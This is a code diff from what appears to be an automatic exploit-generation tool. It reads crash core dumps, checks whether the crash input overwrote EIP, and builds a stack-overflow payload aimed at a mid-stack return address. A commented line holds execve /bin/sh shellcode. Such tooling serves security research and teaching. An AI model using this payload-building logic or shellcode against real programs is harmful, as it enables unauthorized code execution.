@@ -76,7 +76,6 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
 
     command = build_command(arg_config, crash_input)
 
-    #env={**os.environ, **ENV_VARS} => merges the current env variables with the additional ENV_VARS
     crash_proc = subprocess.Popen(
         command,
         stdin=subprocess.PIPE,
@@ -85,34 +84,16 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace):
         env={**os.environ, **ENV_VARS}
         # text=True
     )
+    #env={**os.environ, **ENV_VARS} => merges the current env variables with the additional ENV_VARS
 
     #sending the crash input from stdin to all targets
     crash_proc.communicate(input=crash_input)
 
     core_path = f"/core_dumps/core.{target_bin}.{crash_proc.pid}"
 
-    # gdb_proc = subprocess.Popen(
-    #     [f"gdb -q {target_bin} {core_path}"], 
-    #     stdin=subprocess.PIPE, 
-    #     stdout=subprocess.PIPE, 
-    #     stderr=subprocess.PIPE, 
-    #     shell=True, 
-    #     text=True
-    # )
-
-    # gdb_proc.stdin.write("info registers\n")
-    # gdb_proc.stdin.flush()
-
-    # gdb_proc.stdin.write("q\n")
-    # gdb_proc.stdin.write("y\n")
-    # gdb_proc.stdin.flush()
-
-    # output, _ = gdb_proc.communicate()
-
     core = Corefile(core_path)
     eip = core.eip.to_bytes(4, byteorder='little')
 
-    # eip = extract_eip(output)
 
     #if the value of the eip belongs to the crash input, it means it was overwritten by the crash input and the payload reached the return address
     if eip in crash_input:    
@@ -165,7 +146,7 @@ def payload_builder(crash_input: bytes, target_bin: str):
 
     """
 
-    target_address = stack_middle_address(target_ra(target_bin))
+    target_address = target_ra(target_bin)
     # shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
 
     payload = overwrite_ra(crash_input, target_bin, struct.pack("<I", target_address))
@@ -192,26 +173,6 @@ def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes):
     core_files = glob.glob(f'/core_dumps/core.{target_bin}.*')
     core_path = core_files[-1]
 
-    # gdb_proc = subprocess.Popen(
-    #     [f"gdb -q {target_bin} {core_path}"], 
-    #     stdin=subprocess.PIPE, 
-    #     stdout=subprocess.PIPE, 
-    #     stderr=subprocess.PIPE, 
-    #     shell=True, 
-    #     text=True
-    # )
-
-    # gdb_proc.stdin.write("info registers\n")
-    # gdb_proc.stdin.flush()
-
-    # gdb_proc.stdin.write("q\n")
-    # gdb_proc.stdin.write("y\n")
-    # gdb_proc.stdin.flush()
-
-    # output, _ = gdb_proc.communicate()
-
-    # eip = extract_eip(output)
-
     core = Corefile(core_path)
     eip = core.eip.to_bytes(4, byteorder='little')
 
@@ -223,73 +184,23 @@ def overwrite_ra(crash_input: bytes, target_bin: str, target_ra: bytes):
     return payload
 
 
-def extract_eip(core_output: str):
-
-    eip_value = None
-    for line in core_output.splitlines():
-        if 'eip' in line:  # Find the line with 'eip'
-            eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
-            break
-
-    
-    if eip_value.startswith("0x"):  #remove 0x prefix
-        eip_value = eip_value[2:]
-
-    eip_bytes = bytes.fromhex(eip_value)    #convert to hex bytes
-    eip_bytes = eip_bytes[::-1] 
-
-    return eip_bytes
-
-
 def target_ra(target_bin: str):
 
     #find in what adresses the stack fluctuates -> info proc mapping
 
-    gdb_process = subprocess.Popen(
-        f"gdb {target_bin}", 
-        stdin=subprocess.PIPE, 
-        stdout=subprocess.PIPE, 
-        stderr=subprocess.PIPE, 
-        text=True, 
-        shell=True,
-        env={**os.environ, **ENV_VARS}
-    )
+    core_files = glob.glob(f'/core_dumps/core.{target_bin}.*')
+    core_path = core_files[-1]
 
-    commands = f"""
-    set disable-randomization off
-    set breakpoint pending on
-    b main
-    r
-    info proc mapping
-    q
-    y
-    """
+    core = Corefile(core_path)
 
-    gdb_process.stdin.write(commands)
-    gdb_process.stdin.flush()
-    output, _ = gdb_process.communicate()
+    print(f"Stack Base: {hex(core.stack.start)}")
+    print(f"Stack Top: {hex(core.stack.stop)}")
 
-    return output
+    stack_base = core.stack.start
+    stack_limit = core.stack.stop
+    middle = (stack_base + stack_limit) // 2
+    middle += 4
 
-
-def stack_middle_address(output):
-
-    # Find the line containing the word "stack" and extract the address in the middle
-    output_lines = output.split('\n')
-    stack_line = next((line for line in output_lines if 'stack' in line), None)
-    
-    if stack_line is None:
-        logging.error("GDB failed to find the stack line.")
-        cleanup(1)
-    
-    pattern = r'\b0x[0-9a-f]+\b'
-    matches = re.findall(pattern, stack_line)
-    
-    start_address = int(matches[0], 16)
-    end_address = int(matches[1], 16)
-    
-    middle = (start_address + end_address) // 2
-    middle += 4  #all the addresses end in 00 and when this is concatenated in bytes in the payload, it starts with \x00 and terminates the payload. Adding 4 to avoid the \x00 sequence
+    # print(f'core mappings: {core.stack}')
 
     return middle
-
